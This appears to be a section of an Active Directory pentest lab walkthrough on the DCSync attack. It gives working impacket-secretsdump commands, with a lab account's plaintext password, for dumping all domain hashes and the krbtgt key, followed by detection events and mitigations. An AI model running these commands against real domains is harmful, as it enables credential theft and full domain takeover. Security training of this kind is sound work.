# DCSync Attack

## Overview

Following our successful Kerberoasting attack against the high-value target `EVANGELINE.ISSI`, we obtained and cracked their credentials. This section demonstrates one of the most powerful Active Directory attacks: **DCSync**.

The DCSync attack allows an attacker with sufficient privileges to impersonate a Domain Controller and retrieve password hashes for any user or service account in the domain, effectively compromising the entire Active Directory environment.

## Prerequisites

- Compromised account with DCSync rights (typically Domain Admin, Enterprise Admin, or accounts with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions)
- Network connectivity to the Domain Controller
- `impacket-secretsdump` tool

## Installation

Install the Impacket toolkit:

```bash
# Using apt (Debian/Ubuntu)
sudo apt install python3-impacket

# Or install from GitHub
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
```

## Attack Execution

### Dumping All Domain Credentials

To perform a complete domain credential dump:

```bash
impacket-secretsdump '<DOMAIN>'/'<USERNAME>':'<PASSWORD>'@<DC_FQDN>
```

**Example:**
```bash
impacket-secretsdump 'draven.me'/'EVANGELINE.ISSI':'Draven@123!'@DC1.DRAVEN.ME
```

### Targeting Specific Users

The `krbtgt` account is a critical target as it encrypts all Ticket Granting Tickets (TGTs) in the domain. Compromising this account enables Golden Ticket attacks and complete domain persistence.

To extract only the `krbtgt` credentials:

```bash
impacket-secretsdump 'draven.me'/'EVANGELINE.ISSI':'Draven@123!'@DC1.DRAVEN.ME -just-dc-user krbtgt
```

## Output Analysis

A successful DCSync attack against `krbtgt` yields:

- **NT Hash**: Used for Pass-the-Hash attacks and Golden Ticket generation
- **Kerberos AES Keys** (AES256 and AES128): Modern encryption keys for Kerberos authentication
- **DES Key**: Legacy encryption key (typically disabled in modern environments)

## Impact

Compromising the `krbtgt` account provides:

- **Complete domain control** through Golden Ticket generation
- **Persistent access** (Golden Tickets can be valid for up to 10 years)
- **Ability to forge tickets** for any user, including Domain Admins
- **Bypass of most security controls** as forged tickets appear legitimate

## Detection and Mitigation

### Detection Indicators

- Event ID 4662: Directory Service Access events with Replication permissions
- Event ID 5136: Directory Service object modifications
- Unusual replication traffic from non-DC machines
- Security tool alerts for DCSync behavior

### Mitigation Strategies

1. **Restrict DCSync permissions**: Audit and limit accounts with replication rights
2. **Monitor replication activity**: Alert on replication requests from non-DC systems
3. **Regular password rotation**: Reset `krbtgt` password periodically (twice, 24 hours apart)
4. **Implement PAM**: Use Privileged Access Management for high-value accounts
5. **Enable advanced auditing**: Configure detailed DS Access auditing
6. **Network segmentation**: Restrict DC access to authorized systems only

## Additional Resources

- [Impacket GitHub Repository](https://github.com/SecureAuthCorp/impacket)
- [Microsoft: Active Directory Replication Concepts](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/replication/active-directory-replication-concepts)
- [MITRE ATT&CK: DCSync (T1003.006)](https://attack.mitre.org/techniques/T1003/006/)

---

**⚠️ Legal Disclaimer**: This documentation is for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security assessments.